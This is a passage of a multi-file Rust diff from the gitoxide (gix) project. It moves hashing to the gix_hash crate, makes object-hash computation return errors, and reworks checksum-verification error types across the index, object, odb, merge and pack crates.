(version, self.state.object_hash.null())\n         } else {\n-            let mut hasher = hash::Write::new(&mut out, self.state.object_hash);\n+            let mut hasher = gix_hash::io::Write::new(&mut out, self.state.object_hash);\n             let out: &mut dyn std::io::Write = &mut hasher;\n             let version = self.state.write_to(out, options)?;\n-            (version, gix_hash::ObjectId::from(hasher.hash.digest()))\n+            (version, hasher.hash.try_finalize()?)\n         };\n         out.write_all(hash.as_slice())?;\n         Ok((version, hash))\n\n@@ -49,7 +47,7 @@\nimpl File {\n         let (version, digest) = self.write_to(&mut lock, options)?;\n         match lock.into_inner() {\n             Ok(lock) => lock.commit()?,\n-            Err(err) => return Err(err.into_error().into()),\n+            Err(err) => return Err(Error::Io(err.into_error().into())),\n         };\n         self.state.version = version;\n         self.checksum = Some(digest);\n```\n\nFilename: gix-index/src/write.rs:\n```\n@@ -67,7 +67,7 @@\nimpl State {\n             extensions,\n             skip_hash: _,\n         }: Options,\n-    ) -> std::io::Result<Version> {\n+    ) -> Result<Version, gix_hash::io::Error> {\n         let _span = gix_features::trace::detail!(\"gix_index::State::write()\");\n         let version = self.detect_required_version();\n```\n\nFilename: gix-index/tests/Cargo.toml:\n```\n@@ -20,7 +20,7 @@\ngix-features-parallel = [\"gix-features/parallel\"]\n \n [dev-dependencies]\n gix-index = { path = \"..\" }\n-gix-features = { path = \"../../gix-features\", features = [\"rustsha1\", \"progress\"] }\n+gix-features = { path = \"../../gix-features\", features = [\"progress\"] }\n gix-testtools = { path = \"../../tests/tools\" }\n gix-odb = { path = \"../../gix-odb\" }\n gix-object = { path = \"../../gix-object\" }\n```\n\nFilename: gix-index/tests/index/file/read.rs:\n```\n@@ -328,7 +328,7 @@\nfn v2_split_index_recursion_is_handled_gracefully() {\n     let err = try_file(\"v2_split_index_recursive\").expect_err(\"recursion fails gracefully\");\n     assert!(matches!(\n         err,\n-        gix_index::file::init::Error::Decode(gix_index::decode::Error::ChecksumMismatch { .. })\n+        gix_index::file::init::Error::Decode(gix_index::decode::Error::Verify(_))\n     ));\n }\n```\n\nFilename: gix-merge/tests/merge/blob/mod.rs:\n```\n@@ -43,10 +43,10 @@\nmod util {\n \n     impl ObjectDb {\n         /// Insert `data` and return its hash. That can be used to find it again.\n-        pub fn insert(&mut self, data: &str) -> gix_hash::ObjectId {\n-            let id = gix_object::compute_hash(gix_hash::Kind::Sha1, gix_object::Kind::Blob, data.as_bytes());\n+        pub fn insert(&mut self, data: &str) -> Result<gix_hash::ObjectId, Error> {\n+            let id = gix_object::compute_hash(gix_hash::Kind::Sha1, gix_object::Kind::Blob, data.as_bytes())?;\n             self.data_by_id.insert(id, data.into());\n-            id\n+            Ok(id)\n         }\n     }\n }\n```\n\nFilename: gix-merge/tests/merge/blob/pipeline.rs:\n```\n@@ -67,7 +67,7 @@\nfn without_transformation() -> crate::Result {\n \n         let mut db = ObjectDb::default();\n         let b_content = \"b-content\";\n-        let id = db.insert(b_content);\n+        let id = db.insert(b_content)?;\n \n         let out = filter.convert_to_mergeable(\n             &id,\n\n@@ -148,7 +148,7 @@\nfn binary_below_large_file_threshold() -> crate::Result {\n     assert_eq!(buf.as_bstr(), binary_content);\n \n     let mut db = ObjectDb::default();\n-    let id = db.insert(binary_content);\n+    let id = db.insert(binary_content)?;\n     let out = filter.convert_to_mergeable(\n         &id,\n         EntryKind::Blob,\n\n@@ -203,7 +203,7 @@\nfn above_large_file_threshold() -> crate::Result {\n \n     drop(tmp);\n     let mut db = ObjectDb::default();\n-    let id = db.insert(large_content);\n+    let id = db.insert(large_content)?;\n \n     let out = filter.convert_to_mergeable(\n         &id,\n\n@@ -352,7 +352,7 @@\nfn worktree_filter() -> crate::Result {\n             \"worktree files need to be converted back to what's stored in Git\"\n         );\n \n-        let id = db.insert(a_content);\n+        let id = db.insert(a_content)?;\n         let out = filter.convert_to_mergeable(\n             &id,\n             EntryKind::Blob,\n\n@@ -385,7 +385,7 @@\nfn worktree_filter() -> crate::Result {\n     drop(tmp);\n \n     let b_content = \"b-content\\n\";\n-    let id = db.insert(b_content);\n+    let id = db.insert(b_content)?;\n \n     let out = filter.convert_to_mergeable(\n         &id,\n\n@@ -403,7 +403,7 @@\nfn worktree_filter() -> crate::Result {\n \n     let mut db = ObjectDb::default();\n     let b_content = \"b-content\\r\\n\";\n-    let id = db.insert(b_content);\n+    let id = db.insert(b_content)?;\n     let out = filter.convert_to_mergeable(\n         &id,\n         EntryKind::Blob,\n```\n\nFilename: gix-merge/tests/merge/blob/platform.rs:\n```\n@@ -31,7 +31,7 @@\nmod merge {\n             (\"ours\", ResourceKind::CurrentOrOurs),\n             (\"theirs\\0\", ResourceKind::OtherOrTheirs),\n         ] {\n-            let id = db.insert(content);\n+            let id = db.insert(content)?;\n             platform.set_resource(\n                 id,\n                 EntryKind::Blob,\n\n@@ -81,7 +81,7 @@\nmod merge {\n             (\"any\\0\", ResourceKind::CurrentOrOurs),\n             (\"any\\0\", ResourceKind::OtherOrTheirs),\n         ] {\n-            let id = db.insert(content);\n+            let id = db.insert(content)?;\n             platform.set_resource(\n                 id,\n                 EntryKind::Blob,\n\n@@ -131,7 +131,7 @@\nmod merge {\n             (\"ours\", ResourceKind::CurrentOrOurs),\n             (\"theirs\", ResourceKind::OtherOrTheirs),\n         ] {\n-            let id = db.insert(content);\n+            let id = db.insert(content)?;\n             platform.set_resource(id, EntryKind::Blob, \"b\".into(), kind, &db)?;\n         }\n\n@@ -284,7 +284,7 @@\ntheirs\n             (\"ours\", ResourceKind::CurrentOrOurs),\n             (\"theirs\", ResourceKind::OtherOrTheirs),\n         ] {\n-            let id = db.insert(content);\n+            let id = db.insert(content)?;\n             platform.set_resource(id, EntryKind::Blob, \"b\".into(), kind, &db)?;\n         }\n\n@@ -313,7 +313,7 @@\ntheirs\n             \"we handle word-splitting and definitely pick-up what's written into the %A buffer\"\n         );\n \n-        let id = db.insert(\"binary\\0\");\n+        let id = db.insert(\"binary\\0\")?;\n         platform.set_resource(id, EntryKind::Blob, \"b\".into(), ResourceKind::OtherOrTheirs, &db)?;\n         let platform_ref = platform.prepare_merge(&db, Default::default())?;\n         let res = platform_ref.merge(&mut buf, default_labels(), &Default::default())?;\n```\n\nFilename: gix-object/Cargo.toml:\n```\n@@ -42,7 +42,6 @@\nverbose-object-parsing-errors = [\"winnow/std\"]\n \n [dependencies]\n gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\n-    \"rustsha1\",\n     \"progress\",\n ] }\n gix-hash = { version = \"^0.16.0\", path = \"../gix-hash\" }\n```\n\nFilename: gix-object/benches/edit_tree.rs:\n```\n@@ -136,19 +136,15 @@\ncriterion_main!(benches);\n \n type TreeStore = Rc<RefCell<gix_hashtable::HashMap<ObjectId, Tree>>>;\n \n-fn new_inmemory_writes() -> (TreeStore, impl FnMut(&Tree) -> Result<ObjectId, std::io::Error>) {\n+fn new_inmemory_writes() -> (TreeStore, impl FnMut(&Tree) -> Result<ObjectId, gix_hash::io::Error>) {\n     let store = TreeStore::default();\n     let write_tree = {\n         let store = store.clone();\n         let mut buf = Vec::with_capacity(512);\n         move |tree: &Tree| {\n             buf.clear();\n             tree.write_to(&mut buf)?;\n-            let header = gix_object::encode::loose_header(gix_object::Kind::Tree, buf.len() as u64);\n-            let mut hasher = gix_features::hash::hasher(gix_hash::Kind::Sha1);\n-            hasher.update(&header);\n-            hasher.update(&buf);\n-            let id = hasher.digest().into();\n+            let id = gix_object::compute_hash(gix_hash::Kind::Sha1, gix_object::Kind::Tree, &buf)?;\n             let mut borrowed = store.borrow_mut();\n             match borrowed.entry(id) {\n                 Entry::Occupied(_) => {}\n```\n\nFilename: gix-object/src/data.rs:\n```\n@@ -51,31 +51,24 @@\nimpl<'a> Data<'a> {\n \n /// Types supporting object hash verification\n pub mod verify {\n-\n     /// Returned by [`crate::Data::verify_checksum()`]\n     #[derive(Debug, thiserror::Error)]\n     #[allow(missing_docs)]\n     pub enum Error {\n-        #[error(\"Object expected to have id {desired}, but actual id was {actual}\")]\n-        ChecksumMismatch {\n-            desired: gix_hash::ObjectId,\n-            actual: gix_hash::ObjectId,\n-        },\n+        #[error(\"Failed to hash object\")]\n+        Hasher(#[from] gix_hash::hasher::Error),\n+        #[error(transparent)]\n+        Verify(#[from] gix_hash::verify::Error),\n     }\n \n     impl crate::Data<'_> {\n-        /// Compute the checksum of `self` and compare it with the `desired` hash.\n+        /// Compute the checksum of `self` and compare it with the `expected` hash.\n         /// If the hashes do not match, an [`Error`] is returned, containing the actual\n         /// hash of `self`.\n-        pub fn verify_checksum(&self, desired: &gix_hash::oid) -> Result<(), Error> {\n-            let actual_id = crate::compute_hash(desired.kind(), self.kind, self.data);\n-            if desired != actual_id {\n-                return Err(Error::ChecksumMismatch {\n-                    desired: desired.into(),\n-                    actual: actual_id,\n-                });\n-            }\n-            Ok(())\n+        pub fn verify_checksum(&self, expected: &gix_hash::oid) -> Result<gix_hash::ObjectId, Error> {\n+            let actual = crate::compute_hash(expected.kind(), self.kind, self.data)?;\n+            actual.verify(expected)?;\n+            Ok(actual)\n         }\n     }\n }\n```\n\nFilename: gix-object/src/lib.rs:\n```\n@@ -398,16 +398,22 @@\npub mod decode {\n     }\n }\n \n+fn object_hasher(hash_kind: gix_hash::Kind, object_kind: Kind, object_size: u64) -> gix_hash::Hasher {\n+    let mut hasher = gix_hash::hasher(hash_kind);\n+    hasher.update(&encode::loose_header(object_kind, object_size));\n+    hasher\n+}\n+\n /// A function to compute a hash of kind `hash_kind` for an object of `object_kind` and its `data`.\n #[doc(alias = \"hash_object\", alias = \"git2\")]\n-pub fn compute_hash(hash_kind: gix_hash::Kind, object_kind: Kind, data: &[u8]) -> gix_hash::ObjectId {\n-    let header = encode::loose_header(object_kind, data.len() as u64);\n-\n-    let mut hasher = gix_features::hash::hasher(hash_kind);\n-    hasher.update(&header);\n+pub fn compute_hash(\n+    hash_kind: gix_hash::Kind,\n+    object_kind: Kind,\n+    data: &[u8],\n+) -> Result<gix_hash::ObjectId, gix_hash::hasher::Error> {\n+    let mut hasher = object_hasher(hash_kind, object_kind, data.len() as u64);\n     hasher.update(data);\n-\n-    hasher.digest().into()\n+    hasher.try_finalize()\n }\n \n /// A function to compute a hash of kind `hash_kind` for an object of `object_kind` and its data read from `stream`\n\n@@ -422,10 +428,7 @@\npub fn compute_stream_hash(\n     stream_len: u64,\n     progress: &mut dyn gix_features::progress::Progress,\n     should_interrupt: &std::sync::atomic::AtomicBool,\n-) -> std::io::Result<gix_hash::ObjectId> {\n-    let header = encode::loose_header(object_kind, stream_len);\n-    let mut hasher = gix_features::hash::hasher(hash_kind);\n-\n-    hasher.update(&header);\n-    gix_features::hash::bytes_with_hasher(stream, stream_len, hasher, progress, should_interrupt)\n+) -> Result<gix_hash::ObjectId, gix_hash::io::Error> {\n+    let hasher = object_hasher(hash_kind, object_kind, stream_len);\n+    gix_hash::bytes_with_hasher(stream, stream_len, hasher, progress, should_interrupt)\n }\n```\n\nFilename: gix-object/tests/object/main.rs:\n```\n@@ -12,11 +12,11 @@\nmod tree;\n fn compute_hash() {\n     let hk = gix_hash::Kind::Sha1;\n     assert_eq!(\n-        gix_object::compute_hash(hk, gix_object::Kind::Blob, &[]),\n+        gix_object::compute_hash(hk, gix_object::Kind::Blob, &[]).expect(\"empty hash doesn\u2019t collide\"),\n         gix_hash::ObjectId::empty_blob(hk)\n     );\n     assert_eq!(\n-        gix_object::compute_hash(hk, gix_object::Kind::Tree, &[]),\n+        gix_object::compute_hash(hk, gix_object::Kind::Tree, &[]).expect(\"empty hash doesn\u2019t collide\"),\n         gix_hash::ObjectId::empty_tree(hk)\n     );\n }\n```\n\nFilename: gix-object/tests/object/tree/editor.rs:\n```\n@@ -793,7 +793,7 @@\nmod utils {\n \n     pub(super) fn new_inmemory_writes() -> (\n         TreeStore,\n-        impl FnMut(&Tree) -> Result<ObjectId, std::io::Error>,\n+        impl FnMut(&Tree) -> Result<ObjectId, gix_hash::io::Error>,\n         impl Fn() -> usize,\n     ) {\n         let store = TreeStore::default();\n\n@@ -805,11 +805,7 @@\nmod utils {\n             move |tree: &Tree| {\n                 buf.clear();\n                 tree.write_to(&mut buf)?;\n-                let header = gix_object::encode::loose_header(gix_object::Kind::Tree, buf.len() as u64);\n-                let mut hasher = gix_features::hash::hasher(gix_hash::Kind::Sha1);\n-                hasher.update(&header);\n-                hasher.update(&buf);\n-                let id = hasher.digest().into();\n+                let id = gix_object::compute_hash(gix_hash::Kind::Sha1, gix_object::Kind::Tree, &buf)?;\n                 store.borrow_mut().insert(id, tree.clone());\n                 let old = num_writes.get();\n                 num_writes.set(old + 1);\n```\n\nFilename: gix-odb/Cargo.toml:\n```\n@@ -20,7 +20,7 @@\ndoctest = false\n serde = [\"dep:serde\", \"gix-hash/serde\", \"gix-object/serde\", \"gix-pack/serde\"]\n \n [dependencies]\n-gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\"rustsha1\", \"walkdir\", \"zlib\", \"crc32\"] }\n+gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\"walkdir\", \"zlib\", \"crc32\"] }\n gix-hashtable = { version = \"^0.7.0\", path = \"../gix-hashtable\" }\n gix-hash = { version = \"^0.16.0\", path = \"../gix-hash\" }\n gix-date = { version = \"^0.9.3\", path = \"../gix-date\" }\n```\n\nFilename: gix-odb/src/memory.rs:\n```\n@@ -219,7 +219,7 @@\nwhere\n         let mut buf = Vec::new();\n         from.read_to_end(&mut buf)?;\n \n-        let id = gix_object::compute_hash(self.object_hash, kind, &buf);\n+        let id = gix_object::compute_hash(self.object_hash, kind, &buf)?;\n         map.borrow_mut().insert(id, (kind, buf));\n         Ok(id)\n     }\n```\n\nFilename: gix-odb/src/sink.rs:\n```\n@@ -36,7 +36,7 @@\nimpl gix_object::Write for Sink {\n             Ok(())\n         };\n \n-        let mut hasher = gix_features::hash::hasher(self.object_hash);\n+        let mut hasher = gix_hash::hasher(self.object_hash);\n         hasher.update(&header);\n         possibly_compress(&header).map_err(Box::new)?;\n\n@@ -53,6 +53,6 @@\nimpl gix_object::Write for Sink {\n             c.reset();\n         }\n \n-        Ok(hasher.digest().into())\n+        Ok(hasher.try_finalize()?)\n     }\n }\n```\n\nFilename: gix-odb/src/store_impls/loose/verify.rs:\n```\n@@ -19,12 +19,19 @@\npub mod integrity {\n             kind: gix_object::Kind,\n             id: gix_hash::ObjectId,\n         },\n-        #[error(\"{kind} object {expected} wasn't re-encoded without change - new hash is {actual}\")]\n-        ObjectHashMismatch {\n+        #[error(\"{kind} object {expected} could not be hashed\")]\n+        ObjectHasher {\n+            #[source]\n+            source: gix_hash::hasher::Error,\n             kind: gix_object::Kind,\n-            actual: gix_hash::ObjectId,\n             expected: gix_hash::ObjectId,\n         },\n+        #[error(\"{kind} object wasn't re-encoded without change\")]\n+        ObjectEncodeMismatch {\n+            #[source]\n+            source: gix_hash::verify::Error,\n+            kind: gix_object::Kind,\n+        },\n         #[error(\"Objects were deleted during iteration - try again\")]\n         Retry,\n         #[error(\"Interrupted\")]\n\n@@ -77,14 +84,17 @@\nimpl Store {\n                 .try_find(&id, &mut buf)\n                 .map_err(|_| integrity::Error::Retry)?\n                 .ok_or(integrity::Error::Retry)?;\n-            let actual_id = sink.write_buf(object.kind, object.data).expect(\"sink never fails\");\n-            if actual_id != id {\n-                return Err(integrity::Error::ObjectHashMismatch {\n+            sink.write_buf(object.kind, object.data)\n+                .map_err(|err| integrity::Error::ObjectHasher {\n+                    source: *err.downcast().expect(\"sink can only fail in hasher\"),\n                     kind: object.kind,\n-                    actual: actual_id,\n                     expected: id,\n-                });\n-            }\n+                })?\n+                .verify(&id)\n+                .map_err(|err| integrity::Error::ObjectEncodeMismatch {\n+                    source: err,\n+                    kind: object.kind,\n+                })?;\n             object.decode().map_err(|err| integrity::Error::ObjectDecode {\n                 source: err,\n                 kind: object.kind,\n```\n\nFilename: gix-odb/src/store_impls/loose/write.rs:\n```\n@@ -1,6 +1,6 @@\nuse std::{fs, io, io::Write, path::PathBuf};\n \n-use gix_features::{hash, zlib::stream::deflate};\n+use gix_features::zlib::stream::deflate;\n use gix_object::WriteTo;\n use tempfile::NamedTempFile;\n\n@@ -13,7 +13,7 @@\nuse crate::store_impls::loose;\n pub enum Error {\n     #[error(\"Could not {message} '{path}'\")]\n     Io {\n-        source: io::Error,\n+        source: gix_hash::io::Error,\n         message: &'static str,\n         path: PathBuf,\n     },\n\n@@ -30,12 +30,12 @@\nimpl gix_object::Write for Store {\n     fn write(&self, object: &dyn WriteTo) -> Result<gix_hash::ObjectId, gix_object::write::Error> {\n         let mut to = self.dest()?;\n         to.write_all(&object.loose_header()).map_err(|err| Error::Io {\n-            source: err,\n+            source: err.into(),\n             message: \"write header to tempfile in\",\n             path: self.path.to_owned(),\n         })?;\n         object.write_to(&mut to).map_err(|err| Error::Io {\n-            source: err,\n+            source: err.into(),\n             message: \"stream all data into tempfile in\",\n             path: self.path.to_owned(),\n         })?;\n\n@@ -50,13 +50,13 @@\nimpl gix_object::Write for Store {\n         let mut to = self.dest().map_err(Box::new)?;\n         to.write_all(&gix_object::encode::loose_header(kind, from.len() as u64))\n             .map_err(|err| Error::Io {\n-                source: err,\n+                source: err.into(),\n                 message: \"write header to tempfile in\",\n                 path: self.path.to_owned(),\n             })?;\n \n         to.write_all(from).map_err(|err| Error::Io {\n-            source: err,\n+            source: err.into(),\n             message: \"stream all data into tempfile in\",\n             path: self.path.to_owned(),\n         })?;\n\n@@ -76,14 +76,14 @@\nimpl gix_object::Write for Store {\n         let mut to = self.dest().map_err(Box::new)?;\n         to.write_all(&gix_object::encode::loose_header(kind, size))\n             .map_err(|err| Error::Io {\n-                source: err,\n+                source: err.into(),\n                 message: \"write header to tempfile in\",\n                 path: self.path.to_owned(),\n             })?;\n \n         io::copy(&mut from, &mut to)\n             .map_err(|err| Error::Io {\n-                source: err,\n+                source: err.into(),\n                 message: \"stream all data into tempfile in\",\n                 path: self.path.to_owned(),\n             })\n\n@@ -106,7 +106,7 @@\nimpl Store {\n }\n \n impl Store {\n-    fn dest(&self) -> Result<hash::Write<CompressedTempfile>, Error> {\n+    fn dest(&self) -> Result<gix_hash::io::Write<CompressedTempfile>, Error> {\n         #[cfg_attr(not(unix), allow(unused_mut))]\n         let mut builder = tempfile::Builder::new();\n         #[cfg(unix)]\n\n@@ -115,9 +115,9 @@\nimpl Store {\n             let perms = std::fs::Permissions::from_mode(0o444);\n             builder.permissions(perms);\n         }\n-        Ok(hash::Write::new(\n+        Ok(gix_hash::io::Write::new(\n             deflate::Write::new(builder.tempfile_in(&self.path).map_err(|err| Error::Io {\n-                source: err,\n+                source: err.into(),\n                 message: \"create named temp file in\",\n                 path: self.path.to_owned(),\n             })?),\n\n@@ -127,9 +127,13 @@\nimpl Store {\n \n     fn finalize_object(\n         &self,\n-        hash::Write { hash, inner: file }: hash::Write<CompressedTempfile>,\n+        gix_hash::io::Write { hash, inner: file }: gix_hash::io::Write<CompressedTempfile>,\n     ) -> Result<gix_hash::ObjectId, Error> {\n-        let id = gix_hash::ObjectId::from(hash.digest());\n+        let id = hash.try_finalize().map_err(|err| Error::Io {\n+            source: err.into(),\n+            message: \"hash tempfile in\",\n+            path: self.path.to_owned(),\n+        })?;\n         let object_path = loose::hash_path(&id, self.path.clone());\n         let object_dir = object_path\n             .parent()\n```\n\nFilename: gix-pack/Cargo.toml:\n```\n@@ -34,7 +34,7 @@\nserde = [\"dep:serde\", \"gix-object/serde\"]\n wasm = [\"gix-diff?/wasm\"]\n \n [dependencies]\n-gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\"crc32\", \"rustsha1\", \"progress\", \"zlib\"] }\n+gix-features = { version = \"^0.40.0\", path = \"../gix-features\", features = [\"crc32\", \"progress\", \"zlib\"] }\n gix-path = { version = \"^0.10.14\", path = \"../gix-path\" }\n gix-hash = { version = \"^0.16.0\", path = \"../gix-hash\" }\n gix-chunk = { version = \"^0.4.11\", path = \"../gix-chunk\" }\n```\n\nFilename: gix-pack/src/data/input/bytes_to_entries.rs:\n```\n@@ -1,7 +1,7 @@\nuse std::{fs, io};\n \n-use gix_features::{hash::Hasher, zlib::Decompress};\n-use gix_hash::ObjectId;\n+use gix_features::zlib::Decompress;\n+use gix_hash::{Hasher, ObjectId};\n \n use crate::data::input;\n\n@@ -52,7 +52,7 @@\nwhere\n         object_hash: gix_hash::Kind,\n     ) -> Result<BytesToEntriesIter<BR>, input::Error> {\n         let mut header_data = [0u8; 12];\n-        read.read_exact(&mut header_data)?;\n+        read.read_exact(&mut header_data).map_err(gix_hash::io::Error::from)?;\n \n         let (version, num_objects) = crate::data::header::decode(&header_data)?;\n         assert_eq!(\n\n@@ -69,7 +69,7 @@\nwhere\n             version,\n             objects_left: num_objects,\n             hash: (mode != input::Mode::AsIs).then(|| {\n-                let mut hash = gix_features::hash::hasher(object_hash);\n+                let mut hash = gix_hash::hasher(object_hash);\n                 hash.update(&header_data);\n                 hash\n             }),\n\n@@ -97,7 +97,7 @@\nwhere\n             }\n             None => crate::data::Entry::from_read(&mut self.read, self.offset, self.hash_len),\n         }\n-        .map_err(input::Error::from)?;\n+        .map_err(gix_hash::io::Error::from)?;\n \n         // Decompress object to learn its compressed bytes\n         let compressed_buf = self.compressed_buf.take().unwrap_or_else(|| Vec::with_capacity(4096));\n\n@@ -114,7 +114,7 @@\nwhere\n             decompressor: &mut self.decompressor,\n         };\n \n-        let bytes_copied = io::copy(&mut decompressed_reader, &mut io::sink())?;\n+        let bytes_copied = io::copy(&mut decompressed_reader, &mut io::sink()).map_err(gix_hash::io::Error::from)?;\n         if bytes_copied != entry.decompressed_size {\n             return Err(input::Error::IncompletePack {\n                 actual: bytes_copied,\n\n@@ -138,7 +138,10 @@\nwhere\n \n         let crc32 = if self.compressed.crc32() {\n             let mut header_buf = [0u8; 12 + gix_hash::Kind::longest().len_in_bytes()];\n-            let header_len = entry.header.write_to(bytes_copied, &mut header_buf.as_mut())?;\n+            let header_len = entry\n+                .header\n+                .write_to(bytes_copied, &mut header_buf.as_mut())\n+                .map_err(gix_hash::io::Error::from)?;\n             let state = gix_features::hash::crc32_update(0, &header_buf[..header_len]);\n             Some(gix_features::hash::crc32_update(state, &compressed))\n         } else {\n\n@@ -172,26 +175,22 @@\nwhere\n             let mut id = gix_hash::ObjectId::null(self.object_hash);\n             if let Err(err) = self.read.read_exact(id.as_mut_slice()) {\n                 if self.mode != input::Mode::Restore {\n-                    return Err(err.into());\n+                    return Err(input::Error::Io(err.into()));\n                 }\n             }\n \n             if let Some(hash) = self.hash.take() {\n-                let actual_id = gix_hash::ObjectId::from(hash.digest());\n+                let actual_id = hash.try_finalize().map_err(gix_hash::io::Error::from)?;\n                 if self.mode == input::Mode::Restore {\n                     id = actual_id;\n-                }\n-                if id != actual_id {\n-                    return Err(input::Error::ChecksumMismatch {\n-                        actual: actual_id,\n-                        expected: id,\n-                    });\n+                } else {\n+                    actual_id.verify(&id)?;\n                 }\n             }\n             Some(id)\n         } else if self.mode == input::Mode::Restore {\n             let hash = self.hash.clone().expect(\"in restore mode a hash is set\");\n-            Some(gix_hash::ObjectId::from(hash.digest()))\n+            Some(hash.try_finalize().map_err(gix_hash::io::Error::from)?)\n         } else {\n             None\n         })\n\n@@ -273,7 +272,8 @@\nwhere\n impl crate::data::File {\n     /// Returns an iterator over [`Entries`][crate::data::input::Entry], without making use of the memory mapping.\n     pub fn streaming_iter(&self) -> Result<BytesToEntriesIter<impl io::BufRead>, input::Error> {\n-        let reader = io::BufReader::with_capacity(4096 * 8, fs::File::open(&self.path)?);\n+        let reader =\n+            io::BufReader::with_capacity(4096 * 8, fs::File::open(&self.path).map_err(gix_hash::io::Error::from)?);\n         BytesToEntriesIter::new_from_header(\n             reader,\n             input::Mode::Verify,\n```\n\nFilename: gix-pack/src/data/input/entries_to_bytes.rs:\n```\n@@ -1,7 +1,5 @@\nuse std::iter::Peekable;\n \n-use gix_features::hash;\n-\n use crate::data::input;\n \n /// An implementation of [`Iterator`] to write [encoded entries][input::Entry] to an inner implementation each time\n\n@@ -66,7 +64,7 @@\nwhere\n         self.trailer\n     }\n \n-    fn next_inner(&mut self, entry: input::Entry) -> Result<input::Entry, input::Error> {\n+    fn next_inner(&mut self, entry: input::Entry) -> Result<input::Entry, gix_hash::io::Error> {\n         if self.num_entries == 0 {\n             let header_bytes = crate::data::header::encode(self.data_version, 0);\n             self.output.write_all(&header_bytes[..])?;\n\n@@ -82,7 +80,7 @@\nwhere\n         Ok(entry)\n     }\n \n-    fn write_header_and_digest(&mut self, last_entry: Option<&mut input::Entry>) -> Result<(), input::Error> {\n+    fn write_header_and_digest(&mut self, last_entry: Option<&mut input::Entry>) -> Result<(), gix_hash::io::Error> {\n         let header_bytes = crate::data::header::encode(self.data_version, self.num_entries);\n         let num_bytes_written = if last_entry.is_some() {\n             self.output.stream_position()?\n\n@@ -95,7 +93,7 @@\nwhere\n \n         self.output.rewind()?;\n         let interrupt_never = std::sync::atomic::AtomicBool::new(false);\n-        let digest = hash::bytes(\n+        let digest = gix_hash::bytes(\n             &mut self.output,\n             num_bytes_written,\n             self.object_hash,\n\n@@ -129,21 +127,24 @@\nwhere\n \n         match self.input.next() {\n             Some(res) => Some(match res {\n-                Ok(entry) => self.next_inner(entry).and_then(|mut entry| {\n-                    if self.input.peek().is_none() {\n-                        self.write_header_and_digest(Some(&mut entry)).map(|_| entry)\n-                    } else {\n-                        Ok(entry)\n-                    }\n-                }),\n+                Ok(entry) => self\n+                    .next_inner(entry)\n+                    .and_then(|mut entry| {\n+                        if self.input.peek().is_none() {\n+                            self.write_header_and_digest(Some(&mut entry)).map(|_| entry)\n+                        } else {\n+                            Ok(entry)\n+                        }\n+                    })\n+                    .map_err(input::Error::from),\n                 Err(err) => {\n                     self.is_done = true;\n                     Err(err)\n                 }\n             }),\n             None => match self.write_header_and_digest(None) {\n                 Ok(_) => None,\n-                Err(err) => Some(Err(err)),\n+                Err(err) => Some(Err(err.into())),\n             },\n         }\n     }\n```\n\nFilename: gix-pack/src/data/input/entry.rs:\n```\n@@ -54,7 +54,7 @@\nfn compress_data(obj: &gix_object::Data<'_>) -> Result<Vec<u8>, input::Error> {\n     let mut out = gix_features::zlib::stream::deflate::Write::new(Vec::new());\n     if let Err(err) = std::io::copy(&mut &*obj.data, &mut out) {\n         match err.kind() {\n-            std::io::ErrorKind::Other => return Err(input::Error::Io(err)),\n+            std::io::ErrorKind::Other => return Err(input::Error::Io(err.into())),\n             err => {\n                 unreachable!(\"Should never see other errors than zlib, but got {:?}\", err)\n             }\n```\n\nFilename: gix-pack/src/data/input/types.rs:\n```\n@@ -1,19 +1,14 @@\n-use std::io;\n-\n /// Returned by [`BytesToEntriesIter::new_from_header()`][crate::data::input::BytesToEntriesIter::new_from_header()] and as part\n /// of `Item` of [`BytesToEntriesIter`][crate::data::input::BytesToEntriesIter].\n #[derive(thiserror::Error, Debug)]\n #[allow(missing_docs)]\n pub enum Error {\n     #[error(\"An IO operation failed while streaming an entry\")]\n-    Io(#[from] io::Error),\n+    Io(#[from] gix_hash::io::Error),\n     #[error(transparent)]\n     PackParse(#[from] crate::data::header::decode::Error),\n-    #[error(\"pack checksum in trailer was {expected}, but actual checksum was {actual}\")]\n-    ChecksumMismatch {\n-        expected: gix_hash::ObjectId,\n-        actual: gix_hash::ObjectId,\n-    },\n+    #[error(\"Failed to verify pack checksum in trailer\")]\n+    Verify(#[from] gix_hash::verify::Error),\n     #[error(\"pack is incomplete: it was decompressed into {actual} bytes but {expected} bytes where expected.\")]\n     IncompletePack { actual: u64, expected: u64 },\n     #[error(\"The object {object_id} could not be decoded or wasn't found\")]\n```\n\nFilename: gix-pack/src/data/output/bytes.rs:\n```\n@@ -1,7 +1,5 @@\nuse std::io::Write;\n \n-use gix_features::hash;\n-\n use crate::data::output;\n use crate::exact_vec;\n\n@@ -13,7 +11,7 @@\nwhere\n     E: std::error::Error + 'static,\n {\n     #[error(transparent)]\n-    Io(#[from] std::io::Error),\n+    Io(#[from] gix_hash::io::Error),\n     #[error(transparent)]\n     Input(E),\n }\n\n@@ -24,7 +22,7 @@\npub struct FromEntriesIter<I, W> {\n     /// An iterator for input [`output::Entry`] instances\n     pub input: I,\n     /// A way of writing encoded bytes.\n-    output: hash::Write<W>,\n+    output: gix_hash::io::Write<W>,\n     /// Our trailing hash when done writing all input entries\n     trailer: Option<gix_hash::ObjectId>,\n     /// The amount of objects in the iteration and the version of the packfile to be written.\n\n@@ -71,7 +69,7 @@\nwhere\n         );\n         FromEntriesIter {\n             input,\n-            output: hash::Write::new(output, object_hash),\n+            output: gix_hash::io::Write::new(output, object_hash),\n             trailer: None,\n             entry_version: version,\n             pack_offsets_and_validity: exact_vec(num_entries as usize),\n\n@@ -98,7 +96,9 @@\nwhere\n         let previous_written = self.written;\n         if let Some((version, num_entries)) = self.header_info.take() {\n             let header_bytes = crate::data::header::encode(version, num_entries);\n-            self.output.write_all(&header_bytes[..])?;\n+            self.output\n+                .write_all(&header_bytes[..])\n+                .map_err(gix_hash::io::Error::from)?;\n             self.written += header_bytes.len() as u64;\n         }\n         match self.input.next() {\n\n@@ -116,17 +116,28 @@\nwhere\n                         }\n                         self.written - base_offset\n                     });\n-                    self.written += header.write_to(entry.decompressed_size as u64, &mut self.output)? as u64;\n-                    self.written += std::io::copy(&mut &*entry.compressed_data, &mut self.output)?;\n+                    self.written += header\n+                        .write_to(entry.decompressed_size as u64, &mut self.output)\n+                        .map_err(gix_hash::io::Error::from)? as u64;\n+                    self.written += std::io::copy(&mut &*entry.compressed_data, &mut self.output)\n+                        .map_err(gix_hash::io::Error::from)?;\n                 }\n             }\n             None => {\n-                let digest = 